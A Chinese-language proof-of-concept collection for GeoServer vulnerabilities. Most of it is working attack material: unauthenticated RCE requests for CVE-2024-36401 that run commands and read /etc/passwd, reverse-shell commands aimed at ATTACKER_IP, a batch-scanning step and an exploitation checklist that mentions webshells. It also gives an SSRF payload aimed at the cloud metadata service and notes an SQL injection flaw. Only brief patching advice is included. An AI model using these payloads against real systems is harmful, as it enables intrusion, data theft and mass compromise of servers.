# GeoServer 漏洞 POC

## 系统简介

GeoServer 是一款基于 Java 的开源地理空间数据共享服务器，支持 OGC 标准（WMS、WFS、WCS 等），广泛用于地图发布和空间数据服务。

---

## CVE-2024-36401 — OGC 过滤器属性名称 XPath 注入 RCE（CVSS 9.8）

### 漏洞信息

| 字段 | 详情 |
|------|------|
| CVE | CVE-2024-36401 |
| CVSS | 9.8 (CRITICAL) |
| 漏洞类型 | 远程代码执行（RCE） |
| 认证要求 | 无需认证 |
| 影响版本 | GeoServer < 2.23.6, 2.24.x < 2.24.4, 2.25.x < 2.25.2 |
| 修复版本 | 2.23.6 / 2.24.4 / 2.25.2 |
| 在野利用 | 已被积极利用 |

### 漏洞原理

GeoServer 在处理 OGC（Open Geospatial Consortium）请求参数中的属性名称时，将其作为 XPath 表达式进行不安全的求值（eval）。攻击者可在属性名称参数中嵌入恶意 XPath/OGNL 表达式，服务器在评估时触发任意代码执行，且**无需任何认证**。

### POC — 命令执行（WFS 请求）

```http
GET /geoserver/ows?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'id') HTTP/1.1
Host: target:8080
```

### POC — 命令执行（WMS 请求）

```http
GET /geoserver/ows?service=WMS&version=1.1.1&request=GetMap&layers=sf:archsites&bbox=-180,-90,180,90&width=256&height=256&srs=EPSG:4326&styles=&format=image/png&CQL_FILTER=strConcat(%27x%27)%3Bexec(java.lang.Runtime.getRuntime(),%27touch%20/tmp/pwned%27) HTTP/1.1
Host: target:8080
```

### POC — 反弹 Shell

```bash
# 方法一：直接使用公开 POC 脚本（Chocapikk）
git clone https://github.com/Chocapikk/CVE-2024-36401
cd CVE-2024-36401
pip install -r requirements.txt

# 单目标利用，建立反弹 shell
python exploit.py -u http://target:8080 -ip ATTACKER_IP -rp 4444

# 方法二：Mr-xn POC
git clone https://github.com/Mr-xn/CVE-2024-36401
python CVE-2024-36401.py -u http://target:8080/geoserver
```

### POC — 批量扫描

```bash
python exploit.py --check urls.txt --threads 10 --output results.txt
```

### 手动 curl POC

```bash
# 执行 id 命令
curl -s "http://target:8080/geoserver/ows?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'id')"

# 读取 /etc/passwd
curl -s "http://target:8080/geoserver/ows?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'cat /etc/passwd')"
```

### 利用步骤

1. 确认目标运行 GeoServer < 2.23.6（或对应补丁前版本）
2. 确认 WFS/WMS 端点可访问（通常开放在 8080 端口）
3. 在 `valueReference` 或 `CQL_FILTER` 参数中注入恶意表达式
4. 服务器以 root/tomcat 权限执行注入命令
5. 可建立反弹 shell 或写入 webshell

### 修复建议

- 升级至 GeoServer 2.23.6 / 2.24.4 / 2.25.2 或更高版本
- 部署 WAF 规则过滤 OGC 参数中的表达式注入

### 参考资料

- [GitHub Chocapikk POC](https://github.com/Chocapikk/CVE-2024-36401)
- [GitHub Mr-xn POC](https://github.com/Mr-xn/CVE-2024-36401)
- [GeoServer 官方公告](https://geoserver.org/vulnerability/2024/09/12/cve-2024-36401.html)
- [NVD CVE-2024-36401](https://nvd.nist.gov/vuln/detail/cve-2024-36401)
- [Keysight 技术分析](https://www.keysight.com/blogs/en/tech/nwvs/2024/09/03/cve-2024-36401-rce-in-geoserver)
- [SonicWall 在野利用报告](https://www.sonicwall.com/blog/geoserver-rce-vulnerability-cve-2024-36401-being-exploited-in-the-wild)
- [Bitsight 高置信度检测方案](https://www.bitsight.com/blog/geoserver-cve-2024-36401-tailoring-public-poc-enable-high-confidence-detection)
- GitHub Security Advisory: GHSA-6jj6-gm7p-fcvv
- Metasploit 模块: `exploit/multi/http/geoserver_rce`

---

## CVE-2023-43795 — WPS 端点 SSRF（CVSS 8.6）

### 漏洞信息

| 字段 | 详情 |
|------|------|
| CVE | CVE-2023-43795 |
| CVSS | 8.6 (HIGH) |
| 漏洞类型 | 服务端请求伪造（SSRF） |
| 认证要求 | 无需认证 |
| 影响版本 | GeoServer < 2.23.1 |

### POC

```xml
POST /geoserver/wps HTTP/1.1
Host: target:8080
Content-Type: application/xml

<wps:Execute xmlns:wps="http://www.opengis.net/wps/1.0.0" ...>
  <wps:DataInputs>
    <wps:Input>
      <ows:Identifier>features</ows:Identifier>
      <wps:Reference href="http://169.254.169.254/latest/meta-data/" method="GET"/>
    </wps:Input>
  </wps:DataInputs>
</wps:Execute>
```

---

## CVE-2023-25157 — OGC 过滤器 SQL 注入（CVSS 9.8）

### 漏洞信息

| 字段 | 详情 |
|------|------|
| CVE | CVE-2023-25157 |
| CVSS | 9.8 (CRITICAL) |
| 漏洞类型 | SQL 注入 |
| 影响版本 | GeoServer < 2.23.1 |

OGC 过滤器中的 `CQL_FILTER`、`FILTER`、`propertyName` 参数在 PostGIS/Oracle Spatial 等数据存储中未经净化直接拼接 SQL，可导致数据泄露或数据库篡改。
